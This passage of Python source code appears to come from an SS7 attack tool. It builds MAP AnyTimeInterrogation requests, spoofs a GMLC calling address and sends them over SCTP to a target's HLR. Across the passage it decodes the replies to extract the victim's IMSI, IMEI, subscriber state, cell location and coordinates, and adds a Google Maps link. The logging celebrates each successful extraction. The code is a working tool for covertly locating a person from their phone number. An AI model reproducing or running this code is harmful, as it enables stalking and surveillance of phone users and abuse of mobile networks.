            logger.debug(f"[{unique_id}] Complete method failed: {e1}")
            
            # Method 2: Simplified with basic requested info
            try:
                ati_simplified = {
                    'subscriberIdentity': ('msisdn', target_msisdn_bytes),
                    'requestedInfo': {'locationInformation': None},
                    'gsmSCF-Address': scf_msisdn_bytes
                }
                ati_arg.set_val(ati_simplified)
                success = True
                method_used = "simplified_fallback"
                logger.debug(f"[{unique_id}] ATI simplified fallback successful")
            except Exception as e2:
                logger.debug(f"[{unique_id}] Simplified method failed: {e2}")
                
                # Method 3: Minimal mandatory fields only
                try:
                    ati_minimal = {
                        'subscriberIdentity': ('msisdn', target_msisdn_bytes),
                        'gsmSCF-Address': scf_msisdn_bytes
                    }
                    ati_arg.set_val(ati_minimal)
                    success = True
                    method_used = "minimal_mandatory"
                    logger.debug(f"[{unique_id}] ATI minimal method successful")
                except Exception as e3:
                    logger.error(f"[{unique_id}] All ATI construction methods failed: {e1}, {e2}, {e3}")
                    return None, None, None
        
        if not success:
            logger.error(f"[{unique_id}] Failed to set ATI arguments with any method")
            return None, None, None
        
        # Convert to BER with enhanced error handling
        try:
            param_ber = ati_arg.to_ber()
        except Exception as e:
            logger.error(f"[{unique_id}] ATI BER conversion failed: {e}")
            return None, None, None
        
        logger.debug(f"[{unique_id}] MAP parameter generated: {len(param_ber)} bytes (method: {method_used})")
        
        # Build TCAP Invoke with enhanced configuration
        try:
            invoke = deepcopy(TCAP_MSGS.Invoke)
            invoke_id = random.randint(1, 127)
            
            invoke.set_val({
                'invokeID': invoke_id,
                'opCode': ('localValue', MapOperations.ANY_TIME_INTERROGATION)
            })
            
            # Enhanced parameter setting with verification
            try:
                invoke._cont['parameter'].from_ber(param_ber)
                logger.debug(f"[{unique_id}] Parameter set successfully via from_ber")
            except Exception as pe:
                try:
                    invoke._cont['parameter']._val = param_ber
                    logger.debug(f"[{unique_id}] Parameter set successfully via _val assignment")
                except Exception as pe2:
                    logger.error(f"[{unique_id}] Parameter setting failed: {pe}, {pe2}")
                    return None, None, None
                
        except Exception as e:
            logger.error(f"[{unique_id}] TCAP Invoke creation failed: {e}")
            return None, None, None
        
        # Build Component
        try:
            component = deepcopy(TCAP_MSGS.Component)
            component.set_val(('invoke', invoke.get_val()))
        except Exception as e:
            logger.error(f"[{unique_id}] TCAP Component creation failed: {e}")
            return None, None, None
        
        # Build Begin with enhanced configuration
        try:
            begin = deepcopy(TCAP_MSGS.Begin)
            otid = os.urandom(4)
            
            begin.set_val({
                'otid': otid,
                'components': [component.get_val()]
            })
        except Exception as e:
            logger.error(f"[{unique_id}] TCAP Begin creation failed: {e}")
            return None, None, None
        
        # Build TC Message
        try:
            tc_msg = deepcopy(TCAP_MSGS.TCMessage)
            tc_msg.set_val(('begin', begin.get_val()))
            
            tcap_bytes = tc_msg.to_ber()
        except Exception as e:
            logger.error(f"[{unique_id}] TCAP Message creation failed: {e}")
            return None, None, None
        
        otid_hex = otid.hex()
        
        logger.info(f"[{unique_id}] Professional TCAP built successfully: {len(tcap_bytes)} bytes, OTID: {otid_hex}, InvokeID: {invoke_id}")
        
        return tcap_bytes, otid_hex, invoke_id
        
    except Exception as e:
        logger.error(f"[{unique_id}] Professional ATI PDU build error: {e}")
        import traceback
        logger.debug(f"[{unique_id}] Full traceback: {traceback.format_exc()}")
        return None, None, None

def build_sccp_wrapper_professional(tcap_data: bytes, target_msisdn: str, 
                                   cgpa_gt: str = "212600000001", unique_id: str = "") -> bytes:
    """Professional SCCP wrapper with enhanced addressing and error handling"""
    
    if not SCCP_MODULE or not tcap_data:
        logger.warning(f"[{unique_id}] SCCP not available or no TCAP data, returning raw TCAP")
        return tcap_data
    
    try:
        logger.debug(f"[{unique_id}] Building professional SCCP wrapper")
        
        sccp_udt = SCCP_MODULE.SCCPUnitData()
        
        # Enhanced Called Party Address (HLR) with professional addressing
        cdpa = SCCP_MODULE._SCCPAddr()
        cdpa['AddrInd']['res'].set_val(0)
        cdpa['AddrInd']['RoutingInd'].set_val(1)  # Route on SSN + GT
        cdpa['AddrInd']['GTInd'].set_val(4)       # GT format 4 (NAI + NP + ES + Digits)
        cdpa['AddrInd']['SSNInd'].set_val(1)      # SSN present
        cdpa['AddrInd']['PCInd'].set_val(0)       # PC not present
        cdpa['SSN'].set_val(SSN.HLR)              # HLR SSN (149)
        
        # Enhanced Global Title for Called Party
        gt4_cdpa = cdpa['GT'].get_alt()
        gt4_cdpa['TranslationType'].set_val(0)    # No translation
        gt4_cdpa['NumberingPlan'].set_val(1)      # E.164 numbering plan
        gt4_cdpa['EncodingScheme'].set_val(1)     # BCD, odd number of digits
        gt4_cdpa['spare'].set_val(0)
        gt4_cdpa['NAI'].set_val(4)                # International number
        gt4_cdpa.set_addr_bcd(target_msisdn)
        
        # Enhanced Calling Party Address (GMLC) with professional addressing
        cgpa = SCCP_MODULE._SCCPAddr()
        cgpa['AddrInd']['res'].set_val(0)
        cgpa['AddrInd']['RoutingInd'].set_val(1)  # Route on SSN + GT
        cgpa['AddrInd']['GTInd'].set_val(4)       # GT format 4
        cgpa['AddrInd']['SSNInd'].set_val(1)      # SSN present
        cgpa['AddrInd']['PCInd'].set_val(0)       # PC not present
        cgpa['SSN'].set_val(SSN.GMLC)             # GMLC SSN (147)
        
        # Enhanced Global Title for Calling Party
        gt4_cgpa = cgpa['GT'].get_alt()
        gt4_cgpa['TranslationType'].set_val(0)
        gt4_cgpa['NumberingPlan'].set_val(1)
        gt4_cgpa['EncodingScheme'].set_val(1)
        gt4_cgpa['spare'].set_val(0)
        gt4_cgpa['NAI'].set_val(4)
        gt4_cgpa.set_addr_bcd(cgpa_gt)
        
        # Build professional SCCP UDT with complete addressing
        sccp_udt.set_val({
            'Type': 9,  # UDT (Unitdata)
            'ProtocolClass': {
                'Handling': 0,  # No special handling
                'Class': 0      # Class 0 (connectionless)
            },
            'Pointers': {'Ptr0': 0, 'Ptr1': 0, 'Ptr2': 0},  # Will be calculated
            'CalledPartyAddr': {'Len': 0, 'Value': cdpa.get_val()},
            'CallingPartyAddr': {'Len': 0, 'Value': cgpa.get_val()},
            'Data': {'Len': len(tcap_data), 'Value': tcap_data}
        })
        
        sccp_bytes = sccp_udt.to_bytes()
        
        logger.debug(f"[{unique_id}] Professional SCCP wrapper built: {len(sccp_bytes)} bytes")
        logger.debug(f"[{unique_id}] SCCP addresses: CDPA(HLR)={target_msisdn}, CGPA(GMLC)={cgpa_gt}")
        
        return sccp_bytes
        
    except Exception as e:
        logger.error(f"[{unique_id}] Professional SCCP wrapper error: {e}")
        logger.debug(f"[{unique_id}] Returning raw TCAP data as fallback")
        return tcap_data

# ================================
# ADVANCED TCAP/MAP ANALYSIS ENGINE
# ================================

def analyze_tcap_comprehensive(response_bytes: bytes, unique_id: str) -> TcapAnalysis:
    """Comprehensive TCAP analysis with complete component extraction"""
    
    analysis = TcapAnalysis()
    
    if not PYCRATE_AVAILABLE or not TCAP_MSGS:
        analysis.error_message = "TCAP analysis modules not available"
        return analysis
    
    try:
        logger.debug(f"[{unique_id}] Starting comprehensive TCAP analysis")
        
        # Parse TCAP message
        tcap_msg = TCAP_MSGS.TCMessage()
        tcap_msg.from_ber(response_bytes)
        
        raw_structure = tcap_msg.get_val()
        analysis.raw_structure = raw_structure
        
        # Extract message type and data
        if isinstance(raw_structure, tuple):
            msg_type, msg_data = raw_structure
            analysis.message_type = msg_type
            
            logger.debug(f"[{unique_id}] TCAP message type: {msg_type}")
            
            # Extract transaction ID
            if 'otid' in msg_data:
                analysis.transaction_id = msg_data['otid'].hex()
            elif 'dtid' in msg_data:
                analysis.transaction_id = msg_data['dtid'].hex()
            
            # Analyze dialogue portion
            if 'dialoguePortion' in msg_data:
                analysis.dialogue_portion = analyze_dialogue_portion(msg_data['dialoguePortion'], unique_id)
                
                # Extract application context
                if 'application-context-name' in analysis.dialogue_portion:
                    analysis.application_context = str(analysis.dialogue_portion['application-context-name'])
            
            # Analyze components
            if 'components' in msg_data:
                for component in msg_data['components']:
                    component_analysis = analyze_tcap_component_comprehensive(component, unique_id)
                    analysis.components.append(component_analysis)
            
            analysis.analysis_success = True
            logger.info(f"[{unique_id}] TCAP analysis completed successfully: {msg_type} with {len(analysis.components)} components")
            
        else:
            analysis.error_message = f"Unexpected TCAP structure: {type(raw_structure)}"
            logger.error(f"[{unique_id}] {analysis.error_message}")
        
    except Exception as e:
        analysis.error_message = f"TCAP analysis failed: {str(e)}"
        logger.error(f"[{unique_id}] {analysis.error_message}")
        logger.debug(f"[{unique_id}] TCAP analysis traceback: {traceback.format_exc()}")
    
    return analysis

def analyze_dialogue_portion(dialogue_data: Dict, unique_id: str) -> Dict[str, Any]:
    """Analyze TCAP dialogue portion"""
    try:
        dialogue_analysis = {}
        
        if isinstance(dialogue_data, tuple):
            dialogue_type, dialogue_content = dialogue_data
            dialogue_analysis['dialogue_type'] = dialogue_type
            
            if 'application-context-name' in dialogue_content:
                dialogue_analysis['application-context-name'] = dialogue_content['application-context-name']
            
            if 'user-information' in dialogue_content:
                dialogue_analysis['user-information'] = dialogue_content['user-information']
                
            if 'protocol-version' in dialogue_content:
                dialogue_analysis['protocol-version'] = dialogue_content['protocol-version']
                
        logger.debug(f"[{unique_id}] Dialogue portion analyzed: {dialogue_analysis.get('dialogue_type', 'unknown')}")
        return dialogue_analysis
        
    except Exception as e:
        logger.error(f"[{unique_id}] Dialogue portion analysis failed: {e}")
        return {'error': str(e)}

def analyze_tcap_component_comprehensive(component: Dict, unique_id: str) -> Dict[str, Any]:
    """Comprehensive analysis of a single TCAP component"""
    
    component_analysis = {
        'component_type': '',
        'invoke_id': None,
        'operation_code': None,
        'parameter_data': None,
        'parameter_analysis': {},
        'error_code': None,
        'error_parameter': None,
        'problem_code': None,
        'result_data': None,
        'analysis_success': False
    }
    
    try:
        if isinstance(component, tuple):
            comp_type, comp_data = component
            component_analysis['component_type'] = comp_type
            
            # Analyze Invoke component
            if comp_type == 'invoke':
                component_analysis['invoke_id'] = comp_data.get('invokeID')
                
                if 'opCode' in comp_data:
                    op_code = comp_data['opCode']
                    if isinstance(op_code, tuple) and op_code[0] == 'localValue':
                        component_analysis['operation_code'] = op_code[1]
                
                # Extract and analyze parameter
                if 'parameter' in comp_data:
                    component_analysis['parameter_data'] = comp_data['parameter']
                    
                    if component_analysis['operation_code']:
                        component_analysis['parameter_analysis'] = analyze_map_parameter(
                            component_analysis['operation_code'],
                            comp_data['parameter'],
                            unique_id
                        )
            
            # Analyze ReturnResultLast component (Success response)
            elif comp_type == 'returnResultLast':
                component_analysis['invoke_id'] = comp_data.get('invokeID')
                
                if 'result' in comp_data:
                    result_data = comp_data['result']
                    component_analysis['result_data'] = result_data
                    
                    if 'opCode' in result_data:
                        op_code = result_data['opCode']
                        if isinstance(op_code, tuple) and op_code[0] == 'localValue':
                            component_analysis['operation_code'] = op_code[1]
                    
                    # This is the crucial part for ATI result analysis
                    if 'parameter' in result_data:
                        component_analysis['parameter_data'] = result_data['parameter']
                        component_analysis['parameter_analysis'] = analyze_map_result_comprehensive(
                            component_analysis['operation_code'],
                            result_data['parameter'],
                            unique_id
                        )
            
            # Analyze ReturnError component
            elif comp_type == 'returnError':
                component_analysis['invoke_id'] = comp_data.get('invokeID')
                
                if 'errorCode' in comp_data:
                    error_code = comp_data['errorCode']
                    if isinstance(error_code, tuple) and error_code[0] == 'localValue':
                        component_analysis['error_code'] = error_code[1]
                
                if 'parameter' in comp_data:
                    component_analysis['error_parameter'] = comp_data['parameter']
            
            # Analyze Reject component
            elif comp_type == 'reject':
                component_analysis['invoke_id'] = comp_data.get('invokeID')
                
                if 'problem' in comp_data:
                    component_analysis['problem_code'] = comp_data['problem']
            
            component_analysis['analysis_success'] = True
            logger.debug(f"[{unique_id}] Component analyzed: {comp_type}")
            
    except Exception as e:
        component_analysis['error_message'] = str(e)
        logger.error(f"[{unique_id}] Component analysis failed: {e}")
    
    return component_analysis

def analyze_map_parameter(operation_code: int, parameter_data: bytes, unique_id: str) -> Dict[str, Any]:
    """Analyze MAP parameter for requests"""
    analysis = {}
    
    try:
        if operation_code == MapOperations.ANY_TIME_INTERROGATION:
            # Analyze ATI request parameter
            if PYCRATE_AVAILABLE and MAP_MS:
                ati_arg = MAP_MS.AnyTimeInterrogationArg()
                ati_arg.from_ber(parameter_data)
                
                request_data = ati_arg.get_val()
                analysis['request_type'] = 'AnyTimeInterrogationArg'
                analysis['subscriber_identity'] = request_data.get('subscriberIdentity')
                analysis['requested_info'] = request_data.get('requestedInfo')
                analysis['gsmscf_address'] = request_data.get('gsmSCF-Address')
                
        logger.debug(f"[{unique_id}] MAP parameter analyzed for operation {operation_code}")
        
    except Exception as e:
        analysis['error'] = str(e)
        logger.error(f"[{unique_id}] MAP parameter analysis failed: {e}")
    
    return analysis

def analyze_map_result_comprehensive(operation_code: int, parameter_data: bytes, unique_id: str) -> Dict[str, Any]:
    """Comprehensive MAP result analysis - THE CORE EXTRACTION ENGINE"""
    
    analysis = {
        'operation_code': operation_code,
        'extracted_data': {},
        'location_info': {},
        'subscriber_info': {},
        'equipment_info': {},
        'network_data': {},
        'analysis_success': False,
        'raw_data': parameter_data.hex() if parameter_data else ''
    }
    
    try:
        if operation_code == MapOperations.ANY_TIME_INTERROGATION and PYCRATE_AVAILABLE and MAP_MS:
            logger.info(f"[{unique_id}] Analyzing ATI result - CORE DATA EXTRACTION")
            
            # Parse AnyTimeInterrogationRes
            ati_result = MAP_MS.AnyTimeInterrogationRes()
            ati_result.from_ber(parameter_data)
            
            result_data = ati_result.get_val()
            analysis['raw_result_structure'] = result_data
            
            # Extract subscriber information
            if 'subscriberInfo' in result_data:
                subscriber_info = result_data['subscriberInfo']
                
                # Extract IMSI - CRITICAL DATA
                if 'imsi' in subscriber_info:
                    imsi_bytes = subscriber_info['imsi']
                    analysis['subscriber_info']['imsi'] = decode_imsi_from_bytes(imsi_bytes)
                    logger.info(f"[{unique_id}] ✅ IMSI EXTRACTED: {analysis['subscriber_info']['imsi']}")
                
                # Extract Location Information - CRITICAL DATA
                if 'locationInformation' in subscriber_info:
                    location_data = subscriber_info['locationInformation']
                    location_analysis = extract_location_information_comprehensive(location_data, unique_id)
                    analysis['location_info'] = location_analysis
                    
                    if location_analysis.get('cell_global_identity'):
                        cgi = location_analysis['cell_global_identity']
                        logger.info(f"[{unique_id}] ✅ LOCATION EXTRACTED: {cgi['mcc']}-{cgi['mnc']}-{cgi['lac']}-{cgi['cell_id']}")
                
                # Extract Subscriber State
                if 'subscriberState' in subscriber_info:
                    state_data = subscriber_info['subscriberState']
                    analysis['subscriber_info']['state'] = extract_subscriber_state_comprehensive(state_data)
                    logger.info(f"[{unique_id}] ✅ SUBSCRIBER STATE: {analysis['subscriber_info']['state']}")
                
                # Extract Equipment Status and IMEI
                if 'equipmentStatus' in subscriber_info:
                    equipment_data = subscriber_info['equipmentStatus']
                    analysis['equipment_info']['status'] = str(equipment_data)
                
                # Extract PS Subscriber State (for GPRS/LTE)
                if 'ps-SubscriberState' in subscriber_info:
                    ps_state = subscriber_info['ps-SubscriberState']
                    analysis['subscriber_info']['ps_state'] = str(ps_state)
                
                # Extract IMEI if available
                if 'imei' in subscriber_info:
                    imei_bytes = subscriber_info['imei']
                    analysis['equipment_info']['imei'] = decode_imei_from_bytes(imei_bytes)
                    logger.info(f"[{unique_id}] ✅ IMEI EXTRACTED: {analysis['equipment_info']['imei']}")
                
                # Extract MS Network Capability
                if 'ms-NetworkCapability' in subscriber_info:
                    network_cap = subscriber_info['ms-NetworkCapability']
                    analysis['network_data']['ms_network_capability'] = network_cap.hex()
                
                # Extract MS Radio Access Capability
                if 'ms-RadioAccessCapability' in subscriber_info:
                    radio_cap = subscriber_info['ms-RadioAccessCapability']
                    analysis['network_data']['ms_radio_access_capability'] = radio_cap.hex()
            
            analysis['analysis_success'] = True
            logger.info(f"[{unique_id}] 🎉 MAP ATI RESULT ANALYSIS COMPLETED SUCCESSFULLY")
            
        else:
            logger.debug(f"[{unique_id}] No specific analysis for operation code {operation_code}")
            analysis['extracted_data']['operation_code'] = operation_code
            analysis['extracted_data']['raw_parameter'] = parameter_data.hex()
        
    except Exception as e:
        analysis['error_message'] = str(e)
        logger.error(f"[{unique_id}] MAP result analysis failed: {e}")
        logger.debug(f"[{unique_id}] Analysis traceback: {traceback.format_exc()}")
    
    return analysis

def decode_imsi_from_bytes(imsi_bytes: bytes) -> str:
    """Decode IMSI from BCD bytes according to 3GPP TS 29.002"""
    try:
        if not imsi_bytes or len(imsi_bytes) < 3:
            return ""
        
        # First byte contains length, skip it if present
        if len(imsi_bytes) > 8:
            imsi_bytes = imsi_bytes[1:]
        
        imsi_digits = ""
        for byte_val in imsi_bytes:
            # Extract nibbles (BCD encoding)
            low_nibble = byte_val & 0x0F
            high_nibble = (byte_val & 0xF0) >> 4
            
            if low_nibble <= 9:
                imsi_digits += str(low_nibble)
            if high_nibble <= 9:
                imsi_digits += str(high_nibble)
            elif high_nibble == 0xF:
                break  # Padding reached
        
        return imsi_digits
        
    except Exception as e:
        logger.error(f"IMSI decoding failed: {e}")
        return ""

def decode_imei_from_bytes(imei_bytes: bytes) -> str:
    """Decode IMEI from BCD bytes"""
    try:
        if not imei_bytes:
            return ""
        
        imei_digits = ""
        for byte_val in imei_bytes:
            low_nibble = byte_val & 0x0F
            high_nibble = (byte_val & 0xF0) >> 4
            
            if low_nibble <= 9:
                imei_digits += str(low_nibble)
            if high_nibble <= 9:
                imei_digits += str(high_nibble)
            elif high_nibble == 0xF:
                break
        
        return imei_digits
        
    except Exception as e:
        logger.error(f"IMEI decoding failed: {e}")
        return ""

def extract_location_information_comprehensive(location_data: Dict, unique_id: str) -> Dict[str, Any]:
    """Comprehensive location information extraction"""
    
    location_info = {
        'cell_global_identity': {},
        'location_area_identity': {},
        'vlr_number': '',
        'location_number': '',
        'current_location_retrieved': False,
        'age_of_location_information': None,
        'geographical_information': {},
        'state_of_location': '',
        'google_maps_data': {},
        'extraction_success': False
    }
    
    try:
        # Extract Cell Global Identity - MOST CRITICAL
        if 'cellGlobalIdOrServiceAreaIdOrLAI' in location_data:
            cgi_data = location_data['cellGlobalIdOrServiceAreaIdOrLAI']
            
            if isinstance(cgi_data, tuple):
                choice_type, choice_data = cgi_data
                
                if choice_type == 'cellGlobalIdOrServiceAreaIdFixedLength':
                    cgi_bytes = choice_data
                    if len(cgi_bytes) >= 7:
                        # Parse CGI according to 3GPP TS 29.002
                        mcc_mnc_bytes = cgi_bytes[:3]
                        lac = struct.unpack('>H', cgi_bytes[3:5])[0]
                        cell_id = struct.unpack('>H', cgi_bytes[5:7])[0]
                        
                        # Decode MCC/MNC
                        mcc, mnc = decode_mcc_mnc_from_bcd(mcc_mnc_bytes)
                        
                        location_info['cell_global_identity'] = {
                            'mcc': mcc,
                            'mnc': mnc,
                            'lac': lac,
                            'cell_id': cell_id,
                            'raw_cgi': cgi_bytes.hex(),
                            'operator_info': lookup_operator_info(mcc, mnc)
                        }
                        
                        # Generate enhanced location data with Google Maps
                        enhanced_location = generate_enhanced_location_data(mcc, mnc, lac, cell_id, unique_id)
                        location_info['google_maps_data'] = asdict(enhanced_location)
                        
                        logger.info(f"[{unique_id}] 🌍 CELL LOCATION: {mcc}-{mnc}-{lac}-{cell_id} ({enhanced_location.operator_name})")
        
        # Extract VLR Number
        if 'vlr-number' in location_data:
            vlr_data = location_data['vlr-number']
            location_info['vlr_number'] = decode_address_string(vlr_data)
            logger.debug(f"[{unique_id}] VLR Number: {location_info['vlr_number']}")
        
        # Extract MSC Number
        if 'msc-number' in location_data:
            msc_data = location_data['msc-number']
            location_info['msc_number'] = decode_address_string(msc_data)
            logger.debug(f"[{unique_id}] MSC Number: {location_info['msc_number']}")
        
        # Extract Age of Location Information
        if 'ageOfLocationInformation' in location_data:
            location_info['age_of_location_information'] = location_data['ageOfLocationInformation']
        
        # Extract Geographical Information (if available)
        if 'geographicalInformation' in location_data:
            geo_data = location_data['geographicalInformation']
            location_info['geographical_information'] = decode_geographical_information(geo_data)
        
        # Extract Current Location Retrieved flag
        if 'currentLocationRetrieved' in location_data:
            location_info['current_location_retrieved'] = bool(location_data['currentLocationRetrieved'])
        
        location_info['extraction_success'] = True
        
    except Exception as e:
        logger.error(f"[{unique_id}] Location information extraction failed: {e}")
        location_info['error'] = str(e)
    
    return location_info

def decode_address_string(address_data: bytes) -> str:
    """Decode AddressString according to 3GPP TS 29.002"""
    try:
        if not address_data or len(address_data) < 2:
            return ""
        
        # First byte contains nature of address and numbering plan
        nai_np = address_data[0]
        
        # Remaining bytes contain BCD-encoded digits
        digits = ""
        for byte_val in address_data[1:]:
            low_nibble = byte_val & 0x0F
            high_nibble = (byte_val & 0xF0) >> 4
            
            if low_nibble <= 9:
                digits += str(low_nibble)
            if high_nibble <= 9:
                digits += str(high_nibble)
            elif high_nibble == 0xF:
                break
        
        return digits
        
    except Exception as e:
        logger.error(f"AddressString decoding failed: {e}")
        return ""

def decode_geographical_information(geo_data: bytes) -> Dict[str, Any]:
    """Decode geographical information according to 3GPP TS 23.032"""
    try:
        if not geo_data or len(geo_data) < 8:
            return {}
        
        # This is a simplified implementation
        # Full implementation would handle all geographical information formats
        
        geo_info = {
            'type_of_shape': geo_data[0] & 0x0F,
            'raw_data': geo_data.hex()
        }
        
        # Extract coordinates if it's an ellipsoid point
        if geo_info['type_of_shape'] == 0:  # Ellipsoid point
            if len(geo_data) >= 7:
                latitude_sign = (geo_data[1] & 0x80) >> 7
                latitude = struct.unpack('>I', b'\x00' + geo_data[1:4])[0] & 0x7FFFFF
                longitude = struct.unpack('>I', b'\x00' + geo_data[4:7])[0] & 0x7FFFFF
                
                # Convert to decimal degrees
                lat_decimal = (latitude * 90) / (2**23)
                if latitude_sign:
                    lat_decimal = -lat_decimal
                
                lon_decimal = (longitude * 360) / (2**24)
                if lon_decimal > 180:
                    lon_decimal -= 360
                
                geo_info['latitude'] = lat_decimal
                geo_info['longitude'] = lon_decimal
        
        return geo_info
        
    except Exception as e:
        logger.error(f"Geographical information decoding failed: {e}")
        return {'error': str(e), 'raw_data': geo_data.hex()}

def extract_subscriber_state_comprehensive(state_data) -> str:
    """Extract and decode subscriber state"""
    try:
        if isinstance(state_data, tuple):
            state_type, state_value = state_data
            return f"{state_type}: {state_value}"
        else:
            return str(state_data)
    except Exception as e:
        logger.error(f"Subscriber state extraction failed: {e}")
        return "Unknown"

# ================================
# ENHANCED NETWORK OPERATIONS
# ================================

def send_ati_request_professional(target: TargetInfo, ati_variant: AtiVariant = AtiVariant.BASIC,
                                 cgpa_gt: str = "212600000001", timeout: int = 10) -> EnhancedScanResult:
    """Professional ATI request with comprehensive analysis and data extraction"""
    
    unique_id = f"{target.ip}:{target.port}_{target.msisdn}_{int(time.time())}"
    start_time = time.time()
    
    # Initialize enhanced result structure
    result = EnhancedScanResult(
        target=target,
        result=ScanResult.UNKNOWN_ERROR,
        timestamp=datetime.now(timezone.utc).isoformat(),
        scan_id=SCAN_ID,
        unique_id=unique_id,
        ati_variant=ati_variant.value
    )
    
    try:
        logger.info(f"[{unique_id}] 🚀 Starting professional ATI scan: {target}")
        
        # Build professional ATI PDU
        tcap_data, otid_hex, invoke_id = build_ati_pdu_professional(
            target.msisdn, ati_variant, cgpa_gt, unique_id
        )
        
        if not tcap_data:
            result.result = ScanResult.BUILD_ERROR
            result.error_message = "Failed to build professional ATI PDU"
            return result
        
        result.otid = otid_hex or ""
        result.invoke_id = invoke_id
        result.diagnostic_info['tcap_build_success'] = True
        
        # Build professional SCCP wrapper
        final_data = build_sccp_wrapper_professional(tcap_data, target.msisdn, cgpa_gt, unique_id)
        result.message_size = len(final_data)
        result.diagnostic_info['sccp_build_success'] = True
        
        logger.debug(f"[{unique_id}] Professional message built: {len(final_data)} bytes")
        
        # Send via SCTP with professional error handling
        sock = None
        try:
            sock = sctp.sctpsocket_tcp(socket.AF_INET)
            sock.settimeout(timeout)
            result.diagnostic_info['socket_created'] = True
            
            # Connect with timing
            connect_start = time.time()
            sock.connect((target.ip, target.port))
            connect_time = (time.time() - connect_start) * 1000
            result.diagnostic_info['connection_time_ms'] = connect_time
            
            logger.debug(f"[{unique_id}] Connected in {connect_time:.1f}ms")
            
            # Send data
            sent = sock.sctp_send(final_data, ppid=0)
            result.diagnostic_info['bytes_sent'] = sent
            
            if sent <= 0:
                result.result = ScanResult.NETWORK_ERROR
                result.error_message = f"Failed to send data (sent: {sent} bytes)"
                return result
            
            logger.debug(f"[{unique_id}] Sent {sent}/{len(final_data)} bytes")
            
            # Receive response with enhanced timeout handling
            try:
                response = sock.recv(4096)
                response_time = (time.time() - start_time) * 1000
                result.response_time_ms = response_time
                result.diagnostic_info['response_received'] = True
                
            except socket.timeout:
                result.result = ScanResult.TIMEOUT
                result.error_message = "Response timeout"
                result.response_time_ms = timeout * 1000
                return result
            
        finally:
            if sock:
                sock.close()
                result.diagnostic_info['socket_closed'] = True
        
        # Professional response analysis
        if response and len(response) > 0:
            result.response_data = response
            result.response_hex = response.hex()
            
            logger.info(f"[{unique_id}] 📨 Response received: {len(response)} bytes in {response_time:.1f}ms")
            
            # COMPREHENSIVE PROTOCOL ANALYSIS
            analyze_response_comprehensive(response, result, unique_id)
            
            # If no specific error found, mark as success
            if result.result == ScanResult.UNKNOWN_ERROR:
                result.result = ScanResult.SUCCESS
                
        else:
            result.result = ScanResult.TIMEOUT
            result.error_message = "No response data received"
        
        return result
        
    except socket.timeout:
        result.result = ScanResult.TIMEOUT
        result.error_message = "Connection timeout"
        result.response_time_ms = timeout * 1000
        
    except ConnectionRefusedError:
        result.result = ScanResult.CONNECTION_REFUSED
        result.error_message = "Connection refused"
        result.response_time_ms = (time.time() - start_time) * 1000
        
    except OSError as e:
        result.result = ScanResult.NETWORK_ERROR
        result.error_message = f"Network error: {str(e)}"
        result.response_time_ms = (time.time() - start_time) * 1000
        
    except Exception as e:
        result.result = ScanResult.UNKNOWN_ERROR
        result.error_message = f"Unexpected error: {str(e)}"
        result.response_time_ms = (time.time() - start_time) * 1000
        logger.error(f"[{unique_id}] Unexpected error: {e}")
    
    return result

def analyze_response_comprehensive(response: bytes, result: EnhancedScanResult, unique_id: str):
    """Comprehensive response analysis - THE MAIN ANALYSIS ENGINE"""
    
    try:
        logger.info(f"[{unique_id}] 🔍 Starting comprehensive response analysis")
        
        # Step 1: TCAP Analysis
        result.tcap_analysis = analyze_tcap_comprehensive(response, unique_id)
        
        if result.tcap_analysis.analysis_success:
            logger.info(f"[{unique_id}] ✅ TCAP Analysis Success: {result.tcap_analysis.message_type}")
            
            # Step 2: Analyze each component for MAP data
            for component in result.tcap_analysis.components:
                if component.get('component_type') == 'returnResultLast':
                    # This is the successful response containing our data!
                    if component.get('parameter_analysis', {}).get('analysis_success'):
                        param_analysis = component['parameter_analysis']
                        
                        # Extract all the valuable data
                        if 'subscriber_info' in param_analysis:
                            subscriber_data = param_analysis['subscriber_info']
                            if 'imsi' in subscriber_data:
                                result.subscriber_info.imsi = subscriber_data['imsi']
                            if 'state' in subscriber_data:
                                result.subscriber_info.subscriber_state = subscriber_data['state']
                            if 'ps_state' in subscriber_data:
                                result.additional_info['ps_subscriber_state'] = subscriber_data['ps_state']
                        
                        if 'location_info' in param_analysis:
                            location_data = param_analysis['location_info']
                            if 'cell_global_identity' in location_data:
                                cgi = location_data['cell_global_identity']
                                result.location_info.mcc = cgi.get('mcc', '')
                                result.location_info.mnc = cgi.get('mnc', '')
                                result.location_info.lac = cgi.get('lac', 0)
                                result.location_info.cell_id = cgi.get('cell_id', 0)
                                result.location_info.raw_cgi = cgi.get('raw_cgi', '')
                                
                                # Get operator info
                                operator_info = cgi.get('operator_info', {})
                                result.location_info.operator_name = operator_info.get('name', '')
                                result.location_info.technology = operator_info.get('technology', [])
                                result.location_info.country = operator_info.get('country', '')
                            
                            if 'vlr_number' in location_data:
                                result.location_info.vlr_number = location_data['vlr_number']
                            
                            if 'google_maps_data' in location_data:
                                google_data = location_data['google_maps_data']
                                if google_data.get('coordinates'):
                                    result.location_info.coordinates = (
                                        google_data['coordinates'][0],
                                        google_data['coordinates'][1]
                                    )
                                result.location_info.google_maps_url = google_data.get('google_maps_url', '')
                                result.location_info.address = google_data.get('address', '')
                                result.location_info.city = google_data.get('city', '')
                        
                        if 'equipment_info' in param_analysis:
                            equipment_data = param_analysis['equipment_info']
                            if 'imei' in equipment_data:
                                result.subscriber_info.imei = equipment_data['imei']
                            if 'status' in equipment_data:
                                result.subscriber_info.equipment_status = equipment_data['status']
                        
                        # Store raw MAP analysis data
                        result.additional_info['map_analysis'] = param_analysis
                        
                        logger.info(f"[{unique_id}] 🎉 COMPLETE DATA EXTRACTION SUCCESSFUL!")
                
                elif component.get('component_type') == 'returnError':
                    # Handle MAP errors
                    error_code = component.get('error_code')
                    if error_code:
                        result.map_error_code = error_code
                        result.map_error_message = get_map_error_description(error_code)
                        result.result = ScanResult.MAP_ERROR
                        logger.warning(f"[{unique_id}] MAP Error: {error_code} - {result.map_error_message}")
        
        else:
            result.result = ScanResult.TCAP_ANALYSIS_ERROR
            result.error_message = result.tcap_analysis.error_message
            logger.error(f"[{unique_id}] TCAP analysis failed: {result.tcap_analysis.error_message}")
        
        # Additional analysis and statistics
        result.additional_info.update({
            'response_length': len(response),
            'tcap_message_type': result.tcap_analysis.message_type,
            'transaction_id': result.tcap_analysis.transaction_id,
            'components_count': len(result.tcap_analysis.components),
            'analysis_timestamp': datetime.now(timezone.utc).isoformat()
        })
        
    except Exception as e:
        result.result = ScanResult.PROTOCOL_ERROR
        result.error_message = f"Response analysis failed: {str(e)}"
        logger.error(f"[{unique_id}] Response analysis error: {e}")
        logger.debug(f"[{unique_id}] Analysis traceback: {traceback.format_exc()}")

